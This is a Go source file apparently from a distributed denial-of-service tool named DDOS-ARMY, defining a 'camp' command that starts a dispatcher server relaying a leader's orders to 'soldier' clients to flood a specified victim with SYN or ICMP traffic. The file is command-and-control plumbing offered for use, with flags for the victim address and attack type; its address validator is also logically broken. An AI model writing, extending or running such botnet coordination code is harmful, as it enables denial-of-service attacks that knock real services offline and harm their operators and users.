package cmd

import (
	"fmt"
	"github.com/XORbit01/DDOS-ARMY/dispatcher"
	"github.com/fatih/color"
	"github.com/spf13/cobra"
	"net"
	"strings"
)

// serverCmd represents the server command
var serverCmd = &cobra.Command{
	Use:   "camp",
	Short: "start dispatcher server",
	Long: color.MagentaString(`camp is a command that starts the server and listens for
commands from the leader.
then the soldiers will listen for commands from the server sent from leader.
in other words server is teller and soldiers are listeners.`),

	Run: func(cmd *cobra.Command, args []string) {
		//get the values from the flags
		host, err := cmd.Flags().GetString("host")
		//check if its ip
		if err != nil {
			color.Red("error getting host")
			return
		}

		if !IsValidAddr(host) {
			color.Red("invalid host format, please use ip address using -c/--connect flag")
			return
		}

		port, err := cmd.Flags().GetInt("port")
		if err != nil {
			color.Red("error getting port, please check the port format using -p/--port flag")
			return
		}
		if !IsValidPort(port) {
			color.Red("invalid port format, please use a number between 1 and 65535")
			return
		}
		name, err := cmd.Flags().GetString("name")
		if err != nil {
			color.Red("error getting leader name, please check the name format")
			return
		}
		password, err := cmd.Flags().GetString("password")
		if err != nil {
			color.Red("error getting leader password, please check the password format")
			return
		}
		victim, err := cmd.Flags().GetString("victim")
		if err != nil {
			color.Red("error getting victim server, please check the victim format")
			return
		}
		if victim == "" {
			color.Red("please specify a victim server using --victim flag or -v")
			return
		}
		if !IsValidAddr(victim) {
			color.Red("invalid victim format, please use correct address format")
			return
		}
		ddos, err := cmd.Flags().GetString("ddos")
		if err != nil {
			color.Red("error getting ddos type, please check the ddos format")
			return
		}
		if ddos != "SYN" && ddos != "ICMP" {
			fmt.Println("invalid ddos type, please use SYN or ICMP")
			return
		}
		//start the server
		disp := dispatcher.NewDispatcher()
		disp.Setup(host, fmt.Sprintf("%d", port), name, password, victim, ddos)
		dispatcher.Start(disp)
	},
}

func IsValidAddr(host string) bool {
	//check if its ip
	ip := net.ParseIP(host)
	if ip == nil {
		//check if its http link
		if strings.HasPrefix(host, "http://") && !strings.HasPrefix(host, "https://") {
			return false
		}
	}

	return true
}
func IsValidPort(port int) bool {
	if port <= 0 || port > 65535 {
		return false
	}
	return true
}
func init() {
	rootCmd.AddCommand(serverCmd)

	serverCmd.Flags().StringP("host", "H", "0.0.0.0", "host to listen on ")
	serverCmd.Flags().IntP("port", "p", 8080, "port to listen on")
	serverCmd.Flags().StringP("name", "n", "leader", "name of the leader")
	serverCmd.Flags().StringP("password", "s", "password", " secret password of the leader, this will be used to authenticate the leader")
	serverCmd.Flags().StringP("victim", "v", "", "victim server")
	serverCmd.Flags().StringP("ddos", "d", "SYN", "ddos type (SYN, ICMP)")
}
